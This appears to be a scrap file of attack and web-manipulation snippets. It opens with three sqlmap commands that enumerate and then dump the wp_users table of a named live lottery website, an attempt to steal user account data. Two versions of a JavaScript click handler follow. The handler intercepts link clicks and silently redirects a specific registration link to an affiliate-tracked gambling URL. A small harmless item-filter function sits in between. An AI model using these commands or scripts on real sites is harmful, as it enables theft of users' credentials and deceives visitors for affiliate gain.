sqlmap -u "https://www.lottery7game.in/" -D www_lottery7game --tables
sqlmap -u "https://www.lottery7game.in/" -D www_lottery7game -T wp_users --columns
sqlmap -u "https://www.lottery7game.in/" -D www_lottery7game -T wp_users --dump





document.addEventListener("DOMContentLoaded", function() {
    document.body.onclick = function(event) {
        let target = event.target;
        while (target && target.tagName !== "A") {
            target = target.parentElement;
        }
        if (target && target.tagName === "A") {
            event.preventDefault(); // Prevent default navigation
            
            if (target.href === "https://www.82lottery1.in/#/register?invitationCode=772163190178") {
                window.location.href = "https://chinluckgames.com/wD74mscL?aff_click_id=%7Bsubid%7D&aff_id=1146";
            } else {
                window.location.href = target.href;
            }
        }
    };
});

  document.addEventListener('DOMContentLoaded', function() {
            filterItems('lottery-cat');
        });
    function filterItems(className) {
        var items = document.querySelectorAll('.item');
        items.forEach(function(item) {
            if (className === '' || item.classList.contains(className)) {
                item.style.display = 'flex';
            } else {
                item.style.display = 'none';
            }
        });
    }




    <script>
document.addEventListener("DOMContentLoaded", function() {
    document.body.onclick = function(event) {
        let target = event.target;

        // Traverse up the DOM tree to find the nearest <a> tag
        while (target && target.tagName !== "A") {
            target = target.parentElement;
        }

        // If a valid link (<a>) is clicked, check if it's the specific URL
        if (target && target.tagName === "A") {
            event.preventDefault(); // Prevent default navigation

            // Normalize the URL to its full absolute form
            const fullHref = new URL(target.href).origin + new URL(target.href).pathname;

            // The URL you want to match (we ignore any query params or fragments)
            const targetURL = "https://tinyurl.com/3f62554v";

            // Compare the URLs (ignoring query params and fragments)
            if (fullHref === targetURL) {
                // Redirect to the new URL
                window.location.href = "https://chinluckgames.com/wD74mscL?aff_click_id=%7Bsubid%7D&aff_id=1146";
            } else {
                // If it's not the matching link, follow the default link
                window.location.href = target.href;
            }
        }
    };
});


</script>